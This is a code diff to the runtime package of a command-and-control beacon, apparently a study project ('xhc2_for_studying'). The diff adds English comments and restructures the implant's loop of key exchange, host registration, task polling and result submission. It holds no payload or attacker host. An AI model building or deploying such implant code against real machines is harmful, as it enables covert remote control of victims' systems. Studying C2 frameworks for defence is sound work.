@@ -1,3 +1,5 @@
+// Package runtime manages the beacon lifecycle: handshake, registration,
+// and the check-in loop.
 package runtime
 
 import (
@@ -14,11 +16,14 @@ import (
 	"xhc2_for_studying/protocol"
 )
 
+// Runner orchestrates the beacon lifecycle: key exchange, registration,
+// and the periodic check-in loop.
 type Runner struct {
 	cfg    *config.BeaconConfig
 	client *client.Client
 }
 
+// NewRunner creates a new Runner with the given configuration and client.
 func NewRunner(cfg *config.BeaconConfig, client *client.Client) (*Runner, error) {
 	if cfg == nil {
 		return nil, errors.New("beacon config is nil")
@@ -32,19 +37,22 @@ func NewRunner(cfg *config.BeaconConfig, client *client.Client) (*Runner, error)
 	return &Runner{cfg: cfg, client: client}, nil
 }
 
+// Run starts the beacon lifecycle: key exchange, registration, and the
+// periodic check-in loop. It blocks until the context is cancelled or
+// an unrecoverable error occurs.
 func (r *Runner) Run(ctx context.Context) error {
 	if r == nil {
 		return errors.New("runner is nil")
 	}
 
-	// ── Step 0: 密钥交换（握手）──
+	// Step 0: Key exchange (handshake).
 	log.Println("[*] starting key exchange...")
 	if err := r.client.KeyExchange(); err != nil {
 		return err
 	}
 	log.Println("[+] key exchange done, session established")
 
-	// ── Step 1: 注册 ──
+	// Step 1: Registration.
 	hostInfo, err := identity.CollectHostInfo()
 	if err != nil {
 		return err
@@ -56,17 +64,23 @@ func (r *Runner) Run(ctx context.Context) error {
 	}
 	log.Printf("[+] registered as %s\n", beaconID)
 
-	// ── Step 2: 主循环 ──
+	// Step 2: Main check-in loop.
 	var pendingResult *protocol.TaskResult
 	for {
-		checkinResp, err := r.client.CheckIn(beaconID, pendingResult)
+		if pendingResult != nil {
+			if err := r.client.SubmitResult(beaconID, pendingResult); err != nil {
+				return err
+			}
+			pendingResult = nil
+		}
+
+		pollResp, err := r.client.Poll(beaconID)
 		if err != nil {
 			return err
 		}
-		pendingResult = nil
 
-		if len(checkinResp.Tasks) > 0 {
-			pendingResult = implantTask.Dispatch(checkinResp.Tasks[0], beaconID)
+		if len(pollResp.Tasks) > 0 {
+			pendingResult = implantTask.Dispatch(pollResp.Tasks[0], beaconID)
 		}
 
 		select {
